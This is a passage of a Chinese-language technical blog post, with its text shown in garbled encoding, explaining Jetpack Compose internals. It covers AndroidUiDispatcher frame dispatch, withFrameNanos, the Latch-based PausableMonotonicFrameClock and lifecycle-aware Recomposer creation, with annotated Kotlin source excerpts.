<pre><code class="hljs language-kotlin" lang="kotlin"><span class="hljs-comment">// AndroidUiDispatcher.android.kt</span>
<span class="hljs-keyword">override</span> <span class="hljs-function"><span class="hljs-keyword">fun</span> <span class="hljs-title">doFrame</span><span class="hljs-params">(frameTimeNanos: <span class="hljs-type">Long</span>)</span></span> {
    handler.removeCallbacks(<span class="hljs-keyword">this</span>)
    performTrampolineDispatch() <span class="hljs-comment">// 1. å…ˆæ‰§è¡Œæ‰€æœ‰æ™®é€šçš„åç¨‹ä»»åŠ¡ï¼ˆlaunch çš„ä»»åŠ¡ï¼‰</span>
    performFrameDispatch(frameTimeNanos) <span class="hljs-comment">// 2. å†æ‰§è¡Œæ‰€æœ‰æ³¨å†Œçš„ FrameCallback</span>
}
</code></pre>
<ol>
<li><strong>ä¼˜å…ˆå¤„ç†æ™®é€šä»»åŠ¡</strong>ï¼šå…ˆæ‰§è¡Œå®Œæ‰€æœ‰æ’é˜Ÿçš„æ™®é€šåç¨‹ä»»åŠ¡ï¼ˆTrampoline Dispatchï¼‰ã€‚</li>
<li><strong>åå¤„ç†å¸§ä»»åŠ¡</strong>ï¼šç„¶åå†æ‰§è¡Œ <code>withFrameNanos</code> æ³¨å†Œçš„ä»»åŠ¡ã€‚</li>
</ol>
<p>è¿™ä¿è¯äº†åœ¨æ‰§è¡ŒåŠ¨ç”»å¸§ï¼ˆ<code>withFrameNanos</code>ï¼‰ä¹‹å‰ï¼Œè¯¥å¸§å†…æ‰€æœ‰çš„çŠ¶æ€æ›´æ–°å’Œå‡†å¤‡å·¥ä½œï¼ˆé€šè¿‡æ™®é€š <code>launch</code> æäº¤çš„ä»»åŠ¡ï¼‰éƒ½å·²ç»å®Œæˆã€‚</p>
<p>å¦‚æœå½“å‰æ­£åœ¨å¤„ç†ä¸€å¸§ï¼Œå¹¶ä¸”åœ¨å¤„ç†è¿‡ç¨‹ä¸­åˆè°ƒç”¨äº† <code>withFrameNanos</code>ï¼Œå¦‚æœç›´æ¥æ³¨å†Œåˆ° Choreographerï¼Œå¯èƒ½ä¼šå¯¼è‡´æ„å¤–çš„è¡Œä¸ºï¼ˆå–å†³äº Choreographer çš„å®ç°ï¼Œé€šå¸¸æ˜¯ä¸‹ä¸€å¸§ï¼‰ã€‚ä½†åœ¨ <code>AndroidUiDispatcher</code> ä¸­ï¼Œå®ƒèƒ½æ›´å¥½åœ°ç®¡ç†è¿™äº›é‡å…¥æƒ…å†µï¼Œç¡®ä¿é€»è¾‘æ¸…æ™°ã€‚</p>
<h4 data-id="heading-7">æƒ…å†µ Bï¼šç›´æ¥ä½¿ç”¨ Choreographer æ³¨å†Œ</h4>
<p>è¿™ä¸ªåˆ†æ”¯ç”¨äºé‚£äº›<strong>æ²¡æœ‰è¿è¡Œåœ¨ AndroidUiDispatcher ä¸Šä¸‹æ–‡</strong>ä¸­çš„åç¨‹ã€‚</p>
<p>ä¾‹å¦‚ï¼š</p>
<pre><code class="hljs language-kotlin" lang="kotlin"><span class="hljs-comment">// åœ¨ IO çº¿ç¨‹æˆ–è€…è‡ªå®šä¹‰çš„ Scope ä¸­</span>
CoroutineScope(Dispatchers.IO).launch {
    <span class="hljs-comment">// è¿™é‡Œæ²¡æœ‰ AndroidUiDispatcher</span>
    withFrameNanos { ... } 
}
</code></pre>
<p>æˆ–è€…ä½¿ç”¨äº†ä¸€ä¸ªä¸å±äºå½“å‰ <code>AndroidUiFrameClock</code> çš„ <code>choreographer</code>ã€‚</p>
<p>åœ¨è¿™ç§æƒ…å†µä¸‹ï¼ŒCompose æ— æ³•åˆ©ç”¨ <code>AndroidUiDispatcher</code> çš„ä¼˜åŒ–æœºåˆ¶ï¼Œåªèƒ½å›é€€åˆ°æœ€åŸºç¡€çš„è¡Œä¸ºï¼šç›´æ¥å‘ Android ç³»ç»Ÿçš„ <code>Choreographer</code> æ³¨å†Œå›è°ƒã€‚</p>
<p>è¿™ä¿è¯äº† <code>withFrameNanos</code> å¯ä»¥åœ¨ä»»ä½•åç¨‹ä¸Šä¸‹æ–‡ä¸­ä½¿ç”¨ï¼Œä¸ä»…ä»…æ˜¯åœ¨ Compose çš„ UI çº¿ç¨‹ä¸­ã€‚</p>
<h4 data-id="heading-8">ä¸¤è€…çš„å¯¹æ¯”</h4>



































<table><thead><tr><th align="left">ç‰¹æ€§</th><th align="left">uiDispatcher.postFrameCallback (æƒ…å†µ A)</th><th align="left">choreographer.postFrameCallback (æƒ…å†µ B)</th></tr></thead><tbody><tr><td align="left"><strong>è§¦å‘æ¡ä»¶</strong></td><td align="left">å½“å‰åç¨‹ä¸Šä¸‹æ–‡åŒ…å« <code>AndroidUiDispatcher</code></td><td align="left">å…¶ä»–åç¨‹ä¸Šä¸‹æ–‡ (å¦‚ IO, Default)</td></tr><tr><td align="left"><strong>ç³»ç»Ÿå›è°ƒæ•°</strong></td><td align="left"><strong>åˆå¹¶ä¸º 1 ä¸ª</strong> (æ— è®ºæ³¨å†Œå¤šå°‘æ¬¡)</td><td align="left"><strong>N ä¸ª</strong> (æ³¨å†Œå¤šå°‘æ¬¡å°±æœ‰å¤šå°‘ä¸ª)</td></tr><tr><td align="left"><strong>æ‰§è¡Œé¡ºåº</strong></td><td align="left">åœ¨æ‰€æœ‰æ™®é€šåç¨‹ä»»åŠ¡æ‰§è¡Œ<strong>ä¹‹å</strong></td><td align="left">å–å†³äº Choreographer çš„è°ƒåº¦</td></tr><tr><td align="left"><strong>æ€§èƒ½</strong></td><td align="left">æ›´é«˜ (å‡å°‘ JNI è°ƒç”¨å’Œå¯¹è±¡åˆ†é…)</td><td align="left">æ™®é€š</td></tr><tr><td align="left"><strong>é€‚ç”¨åœºæ™¯</strong></td><td align="left">Compose UI æ¸²æŸ“ã€åŠ¨ç”»</td><td align="left">é€šç”¨å¸§åŒæ­¥ä»»åŠ¡</td></tr></tbody></table>
<h4 data-id="heading-9">å›¾è§£æ‰§è¡Œæµ</h4>
<h4 data-id="heading-10">æƒ…å†µ A: åœ¨ Compose UI çº¿ç¨‹ä¸­</h4>
<pre><code class="hljs language-scss" lang="scss"><span class="hljs-selector-attr">[åç¨‹ 1]</span> withFrameNanos -&gt; æ³¨å†Œåˆ° AndroidUiDispatcher åˆ—è¡¨
<span class="hljs-selector-attr">[åç¨‹ 2]</span> withFrameNanos -&gt; æ³¨å†Œåˆ° AndroidUiDispatcher åˆ—è¡¨
<span class="hljs-selector-attr">[åç¨‹ 3]</span> launch { ... } -&gt; æ³¨å†Œåˆ° AndroidUiDispatcher Trampoline é˜Ÿåˆ—

       ... ç­‰å¾… VSync ...

<span class="hljs-selector-attr">[Choreographer]</span> è§¦å‘ dispatchCallback<span class="hljs-selector-class">.doFrame</span>()
       |
       v
<span class="hljs-selector-attr">[AndroidUiDispatcher]</span>
       <span class="hljs-number">1</span>. <span class="hljs-built_in">performTrampolineDispatch</span>()
          -&gt; æ‰§è¡Œ <span class="hljs-selector-attr">[åç¨‹ 3]</span> çš„ä»»åŠ¡
       
       <span class="hljs-number">2</span>. <span class="hljs-built_in">performFrameDispatch</span>()
          -&gt; æ‰§è¡Œ <span class="hljs-selector-attr">[åç¨‹ 1]</span> çš„å›è°ƒ (æ¢å¤åç¨‹ <span class="hljs-number">1</span>)
          -&gt; æ‰§è¡Œ <span class="hljs-selector-attr">[åç¨‹ 2]</span> çš„å›è°ƒ (æ¢å¤åç¨‹ <span class="hljs-number">2</span>)
</code></pre>
<h4 data-id="heading-11">æƒ…å†µ B: åœ¨å…¶ä»–çº¿ç¨‹ä¸­</h4>
<pre><code class="hljs language-css" lang="css"><span class="hljs-selector-attr">[åç¨‹ IO]</span> withFrameNanos -&gt; ç›´æ¥æ³¨å†Œåˆ° Choreographer

       ... ç­‰å¾… VSync ...

<span class="hljs-selector-attr">[Choreographer]</span> è§¦å‘ FrameCallback
       |
       v
æ¢å¤ <span class="hljs-selector-attr">[åç¨‹ IO]</span>
</code></pre>
<h3 data-id="heading-12">2ã€4 PausableMonotonicFrameClock</h3>
<p><code>PausableMonotonicFrameClock</code>å®ç°äº†<code>MonotonicFrameClock</code>ï¼Œæ„é€ å‡½æ•°ä¸­<code>frameClock</code>å°±æ˜¯<code>AndroidUiFrameClock</code>ï¼Œä½¿ç”¨<code>Latch</code>å¯ä»¥æš‚åœå¸§å¾ªç¯ã€‚<strong>åœ¨activityæš‚åœæœŸé—´ï¼ŒRecomposerä¸»å¾ªç¯æŒ‚èµ·ï¼Œä¸å†æ‰§è¡Œé‡ç»„å·¥ä½œï¼Œä¸å†è°ƒåº¦åŠ¨ç”»å¸§ï¼ŒèŠ‚çœèµ„æºã€‚</strong></p>
<pre><code class="hljs language-kotlin" lang="kotlin"><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">PausableMonotonicFrameClock</span>(<span class="hljs-keyword">private</span> <span class="hljs-keyword">val</span> frameClock: MonotonicFrameClock) :
    MonotonicFrameClock {
    <span class="hljs-keyword">private</span> <span class="hljs-keyword">val</span> latch = Latch()
   
    <span class="hljs-keyword">public</span> <span class="hljs-keyword">val</span> isPaused: <span class="hljs-built_in">Boolean</span>
        <span class="hljs-keyword">get</span>() = !latch.isOpen
    
    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">fun</span> <span class="hljs-title">pause</span><span class="hljs-params">()</span></span> {
        latch.closeLatch()
    }

    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">fun</span> <span class="hljs-title">resume</span><span class="hljs-params">()</span></span> {
        latch.openLatch()
    }

    <span class="hljs-keyword">override</span> <span class="hljs-keyword">suspend</span> <span class="hljs-function"><span class="hljs-keyword">fun</span> <span class="hljs-type">&lt;R&gt;</span> <span class="hljs-title">withFrameNanos</span><span class="hljs-params">(onFrame: (<span class="hljs-type">frameTimeNanos</span>: <span class="hljs-type">Long</span>) -&gt; <span class="hljs-type">R</span>)</span></span>: R {
        latch.await()
        <span class="hljs-keyword">return</span> frameClock.withFrameNanos(onFrame)
    }
}
</code></pre>
<h4 data-id="heading-13">2ã€4ã€1 æ ¸å¿ƒæœºåˆ¶ï¼šLatch é—¨é—©</h4>
<pre><code class="hljs language-kotlin" lang="kotlin"><span class="hljs-keyword">internal</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">Latch</span> {
    <span class="hljs-keyword">private</span> <span class="hljs-keyword">val</span> lock = makeSynchronizedObject()
    <span class="hljs-keyword">private</span> <span class="hljs-keyword">var</span> awaiters = mutableListOf&lt;Continuation&lt;<span class="hljs-built_in">Unit</span>&gt;&gt;()  <span class="hljs-comment">// ç­‰å¾…çš„åç¨‹åˆ—è¡¨</span>
    <span class="hljs-keyword">private</span> <span class="hljs-keyword">var</span> spareList = mutableListOf&lt;Continuation&lt;<span class="hljs-built_in">Unit</span>&gt;&gt;()  <span class="hljs-comment">// å¤‡ç”¨åˆ—è¡¨</span>
    <span class="hljs-keyword">private</span> <span class="hljs-keyword">var</span> _isOpen = <span class="hljs-literal">true</span>  <span class="hljs-comment">// åˆå§‹çŠ¶æ€æ˜¯æ‰“å¼€çš„</span>
}
</code></pre>
<p><strong>å…³é”®ç‚¹</strong>ï¼š</p>
<ul>
<li><code>awaiters</code>ï¼šå­˜å‚¨æ‰€æœ‰å› ä¸º latch å…³é—­è€ŒæŒ‚èµ·çš„åç¨‹çš„Â <code>Continuation</code></li>
<li><code>_isOpen</code>ï¼šé—¨é—©çŠ¶æ€ï¼Œ<code>true</code>Â = æ‰“å¼€ï¼ˆå…è®¸é€šè¿‡ï¼‰ï¼Œ<code>false</code>Â = å…³é—­ï¼ˆé˜»å¡ï¼‰</li>
</ul>
<h4 data-id="heading-14">2ã€4ã€2Â <code>await()</code>Â - ç­‰å¾…é—¨é—©æ‰“å¼€</h4>
<pre><code class="hljs language-kotlin" lang="kotlin"><span class="hljs-keyword">suspend</span> <span class="hljs-function"><span class="hljs-keyword">fun</span> <span class="hljs-title">await</span><span class="hljs-params">()</span></span> {
    <span class="hljs-keyword">if</span> (isOpen) <span class="hljs-keyword">return</span>  <span class="hljs-comment">// å¦‚æœå·²ç»æ‰“å¼€ï¼Œç«‹å³è¿”å›</span>
    
    suspendCancellableCoroutine&lt;<span class="hljs-built_in">Unit</span>&gt; { co -&gt;
        synchronized(lock) { awaiters.add(co) }  <span class="hljs-comment">// å°†å½“å‰åç¨‹åŠ å…¥ç­‰å¾…åˆ—è¡¨</span>
        
        co.invokeOnCancellation { 
            synchronized(lock) { awaiters.remove(co) }  <span class="hljs-comment">// å–æ¶ˆæ—¶ç§»é™¤</span>
        }
    }
}
</code></pre>
<p><strong>å·¥ä½œåŸç†</strong>ï¼š</p>
<ul>
<li>å¦‚æœ latch æ˜¯æ‰“å¼€çš„ï¼Œç«‹å³è¿”å›ï¼Œä¸æŒ‚èµ·</li>
<li>å¦‚æœ latch æ˜¯å…³é—­çš„ï¼ŒæŒ‚èµ·å½“å‰åç¨‹ï¼Œå°†Â <code>Continuation</code>Â åŠ å…¥Â <code>awaiters</code>Â åˆ—è¡¨</li>
<li>åç¨‹ä¼šä¸€ç›´æŒ‚èµ·ï¼Œç›´åˆ°Â <code>openLatch()</code>Â è¢«è°ƒç”¨</li>
</ul>
<h4 data-id="heading-15">2ã€4ã€3Â <code>openLatch()</code>Â - æ‰“å¼€é—¨é—©</h4>
<pre><code class="hljs language-kotlin" lang="kotlin"><span class="hljs-function"><span class="hljs-keyword">fun</span> <span class="hljs-title">openLatch</span><span class="hljs-params">()</span></span> {
    synchronized(lock) {
        <span class="hljs-keyword">if</span> (isOpen) <span class="hljs-keyword">return</span>  <span class="hljs-comment">// å¦‚æœå·²ç»æ‰“å¼€ï¼Œç›´æ¥è¿”å›</span>
        
        <span class="hljs-comment">// äº¤æ¢åˆ—è¡¨ï¼Œé¿å…æ¢å¤çš„åç¨‹ç«‹å³å†æ¬¡ await æ—¶å¹²æ‰°å…¶ä»–åç¨‹çš„æ¢å¤</span>
        <span class="hljs-keyword">val</span> toResume = awaiters
        awaiters = spareList
        spareList = toResume
        _isOpen = <span class="hljs-literal">true</span>
        
        <span class="hljs-comment">// æ¢å¤æ‰€æœ‰ç­‰å¾…çš„åç¨‹</span>
        <span class="hljs-keyword">for</span> (i <span class="hljs-keyword">in</span> <span class="hljs-number">0</span> until toResume.size) {
            toResume[i].resume(<span class="hljs-built_in">Unit</span>)
        }
        toResume.clear()
    }
}
</code></pre>
<p><strong>å·¥ä½œåŸç†</strong>ï¼š</p>
<ul>
<li>å°†Â <code>_isOpen</code>Â è®¾ä¸ºÂ <code>true</code></li>
<li>æ¢å¤Â <code>awaiters</code>Â åˆ—è¡¨ä¸­æ‰€æœ‰æŒ‚èµ·çš„åç¨‹</li>
<li>ä½¿ç”¨åˆ—è¡¨äº¤æ¢æŠ€å·§ï¼Œé¿å…å¹¶å‘é—®é¢˜</li>
</ul>
<h4 data-id="heading-16">2ã€4ã€4Â <code>closeLatch()</code>Â - å…³é—­é—¨é—©</h4>
<pre><code class="hljs language-kotlin" lang="kotlin"><span class="hljs-function"><span class="hljs-keyword">fun</span> <span class="hljs-title">closeLatch</span><span class="hljs-params">()</span></span> {
    synchronized(lock) { _isOpen = <span class="hljs-literal">false</span> }
}
</code></pre>
<p><strong>å·¥ä½œåŸç†</strong>ï¼š</p>
<ul>
<li>å°†Â <code>_isOpen</code>Â è®¾ä¸ºÂ <code>false</code></li>
<li>ä¹‹åè°ƒç”¨Â <code>await()</code>Â çš„åç¨‹éƒ½ä¼šè¢«æŒ‚èµ·</li>
</ul>
<h4 data-id="heading-17">2ã€4ã€5 PausableMonotonicFrameClock å¦‚ä½•ä½¿ç”¨ Latch</h4>
<pre><code class="hljs language-kotlin" lang="kotlin"><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">PausableMonotonicFrameClock</span>(<span class="hljs-keyword">private</span> <span class="hljs-keyword">val</span> frameClock: MonotonicFrameClock) :
    MonotonicFrameClock {
    <span class="hljs-keyword">private</span> <span class="hljs-keyword">val</span> latch = Latch()  <span class="hljs-comment">// åˆ›å»ºä¸€ä¸ª latch</span>
    
    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">fun</span> <span class="hljs-title">pause</span><span class="hljs-params">()</span></span> {
        latch.closeLatch()  <span class="hljs-comment">// å…³é—­ latch</span>
    }
    
    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">fun</span> <span class="hljs-title">resume</span><span class="hljs-params">()</span></span> {
        latch.openLatch()  <span class="hljs-comment">// æ‰“å¼€ latch</span>
    }
    
    <span class="hljs-keyword">override</span> <span class="hljs-keyword">suspend</span> <span class="hljs-function"><span class="hljs-keyword">fun</span> <span class="hljs-type">&lt;R&gt;</span> <span class="hljs-title">withFrameNanos</span><span class="hljs-params">(onFrame: (<span class="hljs-type">frameTimeNanos</span>: <span class="hljs-type">Long</span>) -&gt; <span class="hljs-type">R</span>)</span></span>: R {
        latch.await()  <span class="hljs-comment">// ç­‰å¾… latch æ‰“å¼€</span>
        <span class="hljs-keyword">return</span> frameClock.withFrameNanos(onFrame)  <span class="hljs-comment">// å§”æ‰˜ç»™å®é™…çš„ frameClock</span>
    }
}
</code></pre>
<h4 data-id="heading-18">2ã€4ã€6 è¯¦ç»†æ­¥éª¤è¯´æ˜</h4>
<p><strong>æ­¥éª¤ 1ï¼šæ­£å¸¸è¿è¡Œ</strong></p>
<pre><code class="hljs language-rust" lang="rust"><span class="hljs-comment">// Recomposer ä¸»å¾ªç¯</span>
parentFrameClock.withFrameNanos { frameTime <span class="hljs-punctuation">-&gt;</span>
    <span class="hljs-comment">// æ‰§è¡Œé‡ç»„å·¥ä½œ</span>
}
</code></pre>
<ol>
<li><code>PausableMonotonicFrameClock.withFrameNanos()</code>Â è¢«è°ƒç”¨</li>
<li>è°ƒç”¨Â <code>latch.await()</code></li>
<li>ç”±äºÂ <code>latch.isOpen = true</code>ï¼Œç«‹å³è¿”å›</li>
<li>å§”æ‰˜ç»™Â <code>frameClock.withFrameNanos()</code>ï¼ˆå³Â <code>AndroidUiDispatcher</code>ï¼‰</li>
<li>è·å–å¸§æ—¶é—´ï¼Œæ‰§è¡Œé‡ç»„</li>
</ol>
<p><strong>æ­¥éª¤ 2ï¼šæš‚åœ</strong></p>
<pre><code class="hljs language-scss" lang="scss"><span class="hljs-comment">// æŸä¸ªæ¡ä»¶è§¦å‘æš‚åœ</span>
pausableClock<span class="hljs-selector-class">.pause</span>()  <span class="hljs-comment">// è°ƒç”¨ latch.closeLatch()</span>
</code></pre>
<ol>
<li>
<p><code>latch._isOpen</code>Â è¢«è®¾ä¸ºÂ <code>false</code></p>
</li>
<li>
<p>ä¸‹ä¸€æ¬¡Â <code>withFrameNanos()</code>Â è°ƒç”¨æ—¶ï¼š</p>
<ul>
<li><code>latch.await()</code>Â æ£€æŸ¥åˆ°Â <code>isOpen = false</code></li>
<li>åç¨‹æŒ‚èµ·ï¼Œ<code>Continuation</code>Â åŠ å…¥Â <code>awaiters</code>Â åˆ—è¡¨</li>
<li><strong>å¸§å¾ªç¯æš‚åœï¼Œä¸å†æ¶ˆè€— CPU</strong></li>
</ul>
</li>
</ol>
<p><strong>æ­¥éª¤ 3ï¼šæ¢å¤</strong>
åœ¨activityæ¢å¤çš„æ—¶å€™ï¼Œè°ƒç”¨<code>latch.openLatch()</code></p>
<pre><code class="hljs language-scss" lang="scss"><span class="hljs-comment">// åœ¨activityæ¢å¤çš„æ—¶å€™è§¦å‘</span>
pausableClock<span class="hljs-selector-class">.resume</span>()  <span class="hljs-comment">// è°ƒç”¨ latch.openLatch()</span>
</code></pre>
<ol>
<li><code>latch._isOpen</code>Â è¢«è®¾ä¸ºÂ <code>true</code></li>
<li>éå†Â <code>awaiters</code>Â åˆ—è¡¨ï¼Œè°ƒç”¨æ¯ä¸ªÂ <code>Continuation.resume(Unit)</code></li>
<li>æŒ‚èµ·çš„åç¨‹æ¢å¤æ‰§è¡Œ</li>
<li>ç»§ç»­è°ƒç”¨Â <code>frameClock.withFrameNanos()</code></li>
<li><strong>å¸§å¾ªç¯æ¢å¤</strong></li>
</ol>
<h2 data-id="heading-19">ä¸‰ã€Recomposerä¸effectCoroutineContext</h2>
<p><code>Recomposer</code>Â æ˜¯ Compose çš„æ ¸å¿ƒè°ƒåº¦å™¨ï¼Œè´Ÿè´£ç®¡ç†æ‰€æœ‰ Composition çš„é‡ç»„å’Œå¸§å¾ªç¯ã€‚</p>
<h3 data-id="heading-20">3ã€1 Recomposer åœ¨å“ªé‡Œåˆ›å»ºï¼Ÿ</h3>
<p><code>Recomposer</code>Â åœ¨Â <code>ComponentActivity.setContent</code>Â å†…éƒ¨é€šè¿‡Â <code>WindowRecomposer</code>Â å·¥å‚æ–¹æ³•åˆ›å»ºã€‚</p>
<pre><code class="hljs language-kotlin" lang="kotlin"><span class="hljs-comment">// WindowRecomposer.android.kt</span>
<span class="hljs-function"><span class="hljs-keyword">fun</span> View.<span class="hljs-title">createLifecycleAwareWindowRecomposer</span><span class="hljs-params">(
    coroutineContext: <span class="hljs-type">CoroutineContext</span> = EmptyCoroutineContext,
    lifecycle: <span class="hljs-type">Lifecycle</span>? = <span class="hljs-literal">null</span>,
)</span></span>: Recomposer {
    <span class="hljs-comment">// è·å–ä¸»çº¿ç¨‹ Dispatcherï¼Œä¹Ÿå°±æ˜¯AndroidUiDispatcher.Main</span>
    <span class="hljs-comment">// baseContextåŒ…å«äº†AndroidUiDispatcherå’ŒAndroidUiFrameClock</span>
    <span class="hljs-keyword">val</span> baseContext =
        <span class="hljs-keyword">if</span> (
            coroutineContext[ContinuationInterceptor] == <span class="hljs-literal">null</span> ||
                coroutineContext[MonotonicFrameClock] == <span class="hljs-literal">null</span>
        ) {
            AndroidUiDispatcher.CurrentThread + coroutineContext
        } <span class="hljs-keyword">else</span> coroutineContext
    <span class="hljs-comment">// è·å–åŠ¨ç”»æ—¶é’Ÿ (PausableMonotonicFrameClock)</span>
    <span class="hljs-comment">// å®ƒåŒ…è£…äº†åŸºäº Choreographer çš„ AndroidUiFrameClockï¼Œæ”¯æŒæš‚åœ</span>
    <span class="hljs-keyword">val</span> pausableClock =
        baseContext[MonotonicFrameClock]?.let { PausableMonotonicFrameClock(it).apply { pause() } }

    <span class="hljs-comment">// MotionDurationScaleï¼šæ§åˆ¶åŠ¨ç”»é€Ÿåº¦ï¼Œéœ€è¦æ”¯æŒ"å¼€å‘è€…é€‰é¡¹"ä¸­çš„"åŠ¨ç”»æ—¶é•¿ç¼©æ”¾"è®¾ç½®ã€‚è¿™æ˜¯é€šè¿‡Â `MotionDurationScale`Â æ¥å£å®ç°çš„ã€‚</span>
    <span class="hljs-keyword">var</span> systemDurationScaleSettingConsumer: MotionDurationScaleImpl? = <span class="hljs-literal">null</span>
    <span class="hljs-keyword">val</span> motionDurationScale =
        baseContext[MotionDurationScale]
            ?: MotionDurationScaleImpl().also { systemDurationScaleSettingConsumer = it }

    <span class="hljs-comment">// baseContextä¸ºAndroidUiDispatcherå’ŒAndroidUiFrameClock</span>
    <span class="hljs-comment">// PausableMonotonicFrameClockå’ŒAndroidUiFrameClockéƒ½å®ç°äº†MonotonicFrameClock</span>
    <span class="hljs-comment">// baseContext + pausableClockï¼ŒPausableMonotonicFrameClockåœ¨å³è¾¹</span>
    <span class="hljs-comment">// PausableMonotonicFrameClockä¼šè¦†ç›–AndroidUiFrameClock</span>
    <span class="hljs-comment">// æœ€ç»ˆcontextWithClockAndMotionScaleåŒ…å«äº†AndroidUiDispatcherã€PausableMonotonicFrameClockå’ŒMotionDurationScale</span>
    <span class="hljs-keyword">val</span> contextWithClockAndMotionScale =
        baseContext + (pausableClock ?: EmptyCoroutineContext) + motionDurationScale
    <span class="hljs-comment">// åˆ›å»ºRecomposerå¯¹è±¡</span>
    <span class="hljs-keyword">val</span> recomposer =
        Recomposer(contextWithClockAndMotionScale).also { it.pauseCompositionFrameClock() }
    <span class="hljs-comment">// åˆ›å»ºåç¨‹ä½œç”¨åŸŸï¼Œä¸Šä¸‹æ–‡åŒ…å«äº†AndroidUiDispatcherã€PausableMonotonicFrameClockå’ŒMotionDurationScale    </span>
    <span class="hljs-keyword">val</span> runRecomposeScope = CoroutineScope(contextWithClockAndMotionScale)
    <span class="hljs-keyword">val</span> viewTreeLifecycle =
        checkPreconditionNotNull(lifecycle ?: findViewTreeLifecycleOwner()?.lifecycle) {
            <span class="hljs-string">"ViewTreeLifecycleOwner not found from <span class="hljs-variable">$this</span>"</span>
        }
    <span class="hljs-comment">// ä½¿ç”¨LifeCycleç›‘å¬activityç”Ÿå‘½å‘¨æœŸ    </span>
    viewTreeLifecycle.addObserver(
        <span class="hljs-keyword">object</span> : LifecycleEventObserver {
            <span class="hljs-keyword">override</span> <span class="hljs-function"><span class="hljs-keyword">fun</span> <span class="hljs-title">onStateChanged</span><span class="hljs-params">(source: <span class="hljs-type">LifecycleOwner</span>, event: <span class="hljs-type">Lifecycle</span>.<span class="hljs-type">Event</span>)</span></span> {
                <span class="hljs-keyword">val</span> self = <span class="hljs-keyword">this</span>
                <span class="hljs-keyword">when</span> (event) {
                    Lifecycle.Event.ON_CREATE -&gt; {
                        <span class="hljs-comment">// åœ¨Activityçš„onCreateä¸­å¯åŠ¨åç¨‹</span>
                        runRecomposeScope.launch(start = CoroutineStart.UNDISPATCHED) {
                            <span class="hljs-keyword">var</span> durationScaleJob: Job? = <span class="hljs-literal">null</span>
                            <span class="hljs-keyword">try</span> {
                                durationScaleJob =
                                    systemDurationScaleSettingConsumer?.let {
                                        <span class="hljs-keyword">val</span> durationScaleStateFlow =
                                            getAnimationScaleFlowFor(context.applicationContext)
                                        it.scaleFactor = durationScaleStateFlow.value
                                        launch {
                                            durationScaleStateFlow.collect { scaleFactor -&gt;
                                                it.scaleFactor = scaleFactor
                                            }
                                        }
                                    }
                                <span class="hljs-comment">// åœ¨åç¨‹ä¸­å¼€å¯å¸§å¾ªç¯    </span>
                                recomposer.runRecomposeAndApplyChanges()
                            } <span class="hljs-keyword">finally</span> {
                                durationScaleJob?.cancel()
                                <span class="hljs-comment">// If runRecomposeAndApplyChanges returns or this coroutine is</span>
                                <span class="hljs-comment">// cancelled it means we no longer care about this lifecycle.</span>
                                <span class="hljs-comment">// Clean up the dangling references tied to this observer.</span>
                                source.lifecycle.removeObserver(self)
                            }
                        }
                    }
                    Lifecycle.Event.ON_START -&gt; {
                        <span class="hljs-comment">// æ¢å¤æ—¶é’Ÿ</span>
                        pausableClock?.resume()

                        <span class="hljs-comment">// Resumes the frame clock dispatching If this is an ON_START after an</span>
                        <span class="hljs-comment">// ON_STOP that paused it. If the recomposer is not paused  calling</span>
                        <span class="hljs-comment">// `resumeFrameClock()` is ignored.</span>
                        recomposer.resumeCompositionFrameClock()
                    }
                    Lifecycle.Event.ON_STOP -&gt; {
                        <span class="hljs-comment">// Pause the recomposer's frame clock which will pause all calls to</span>
                        <span class="hljs-comment">// `withFrameNanos` (e.g. animations) while the window is stopped.                </span>
                        <span class="hljs-comment">// æš‚åœé‡ç»„å™¨çš„å¸§æ—¶é’Ÿï¼Œè¿™å°†æš‚åœæ‰€æœ‰è°ƒç”¨withFrameNanosæ–¹æ³•çš„å¯¹è±¡</span>
                        recomposer.pauseCompositionFrameClock()
                    }
                    Lifecycle.Event.ON_DESTROY -&gt; {
                        recomposer.cancel()
                    }
                    Lifecycle.Event.ON_PAUSE -&gt; {
                        <span class="hljs-comment">// Nothing</span>
                    }
                    Lifecycle.Event.ON_RESUME -&gt; {
                        <span class="hljs-comment">// Nothing</span>
                    }
                    Lifecycle.Event.ON_ANY -&gt; {
                        <span class="hljs-comment">// Nothing</span>
                    }
                }
            }
        }
    )
    <span class="hljs-keyword">return</span> recomposer
}
</code></pre>
<p>åŠ ä¸Šäº†æ³¨é‡Šï¼Œç†è§£èµ·æ¥åº”å½“ä¸éš¾ã€‚éœ€è¦æ³¨æ„çš„æ˜¯åç¨‹ä¸Šä¸‹æ–‡ï¼Œä»£ç ä¸­çš„<code>contextWithClockAndMotionScale</code>åŒ…å«äº†<code>AndroidUiDispatcher</code>ã€<code>PausableMonotonicFrameClock</code>å’Œ<code>MotionDurationScale</code>ã€‚å¦‚æœä½ æ²¡ç†è§£ï¼Œä¼°è®¡æ˜¯æ²¡çœ‹æ‡‚åç¨‹ä¸Šä¸‹æ–‡çš„ <strong><code>+</code>æ“ä½œç¬¦</strong>ï¼Œå¯ä»¥æŸ¥çœ‹<a href="https://juejin.cn/post/7600291308409716790" target="_blank" title="https://juejin.cn/post/7600291308409716790">ComposeåŸç†å…­ä¹‹Kotlinåç¨‹ä¸Šä¸‹æ–‡</a>ã€‚</p>
<p>åˆ›å»ºå®ŒRecomposerå¯¹è±¡åï¼Œä½¿ç”¨LifeCycleç›‘å¬activityç”Ÿå‘½å‘¨æœŸï¼Œåœ¨Activityçš„onCreateä¸­å¯åŠ¨åç¨‹ï¼Œåœ¨åç¨‹ä¸­è°ƒç”¨<code>runRecomposeAndApplyChanges</code>ï¼Œå¼€å¯å¸§å¾ªç¯ã€‚</p>
<h3 data-id="heading-21">3ã€2 Recomposerçš„åç¨‹ä¸Šä¸‹æ–‡åŒ…å«å“ªäº›å†…å®¹</h3>
<p><code>effectCoroutineContext</code>å°±æ˜¯ä¸Šå°èŠ‚ä¸­çš„<code>contextWithClockAndMotionScale</code>ã€‚</p>
<pre><code class="hljs language-kotlin" lang="kotlin"><span class="hljs-comment">// Recomposer.kt æºç åˆ†æ</span>

<span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">Recomposer</span>(effectCoroutineContext: CoroutineContext) : CompositionContext() {

    
    <span class="hljs-comment">/**
